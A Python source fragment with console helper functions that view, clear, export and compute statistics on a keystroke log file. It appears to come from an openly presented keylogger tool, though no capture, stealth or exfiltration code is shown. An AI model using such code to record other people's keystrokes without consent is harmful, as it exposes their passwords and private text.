def view_log():
    if not os.path.isfile(LOG_FILE):
        print("\n  ⚠  No log file found yet. Start a logging session first.")
        return
    with open(LOG_FILE, "r", encoding="utf-8") as f:
        lines = f.readlines()
    if not lines:
        print("\n  Log file is empty.")
        return

    print(f"\n  ─── Log File: {os.path.abspath(LOG_FILE)} ───")
    print(f"  Total entries: {len(lines)}\n")

    # Show last 50 entries
    display = lines[-50:]
    for line in display:
        print(f"  {line.rstrip()}")
    if len(lines) > 50:
        print(f"\n  … {len(lines) - 50} older entries not shown.")
    print()


def clear_log():
    confirm = input("\n  Clear ALL log data? (yes/no): ").strip().lower()
    if confirm == "yes":
        with open(LOG_FILE, "w", encoding="utf-8") as f:
            f.write("")
        print("  ✅  Log file cleared.")
    else:
        print("  ↩  Cancelled.")


def export_log():
    if not os.path.isfile(LOG_FILE):
        print("\n  ⚠  No log file to export.")
        return
    dest = input("\n  Export as (e.g. session1.txt): ").strip()
    if not dest:
        dest = f"keylog_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    if not dest.endswith(".txt"):
        dest += ".txt"
    with open(LOG_FILE, "r", encoding="utf-8") as f:
        data = f.read()
    with open(dest, "w", encoding="utf-8") as f:
        f.write(data)
    print(f"  ✅  Exported to: {os.path.abspath(dest)}")


def log_stats():
    if not os.path.isfile(LOG_FILE):
        print("\n  ⚠  No log file found.")
        return
    with open(LOG_FILE, "r", encoding="utf-8") as f:
        lines = [l.strip() for l in f if l.strip()]

    regular = [l for l in lines if "KEY     :" in l]
    special  = [l for l in lines if "SPECIAL :" in l]
    sessions = [l for l in lines if "SESSION" in l]

    # Character frequency
    freq = {}
    for line in regular:
        parts = line.split("KEY     :")
        if len(parts) == 2:
            ch = parts[1].strip()
            freq[ch] = freq.get(ch, 0) + 1

    top5 = sorted(freq.items(), key=lambda x: x[1], reverse=True)[:5]

    print(f"\n  ─── Log Statistics ────────────────────────────────")
    print(f"  📄  Log file     : {os.path.abspath(LOG_FILE)}")
    print(f"  💾  File size    : {os.path.getsize(LOG_FILE) / 1024:.2f} KB")
    print(f"  🔢  Total lines  : {len(lines)}")
    print(f"  ⌨️   Regular keys : {len(regular)}")
    print(f"  🎛️   Special keys : {len(special)}")
    print(f"  📅  Sessions     : {len(sessions)}")
    if top5:
        print(f"\n  🏆  Top 5 most-pressed keys:")
        for ch, count in top5:
            bar = "█" * min(count, 30)
            print(f"      '{ch}'  {bar} {count}x")
    print()


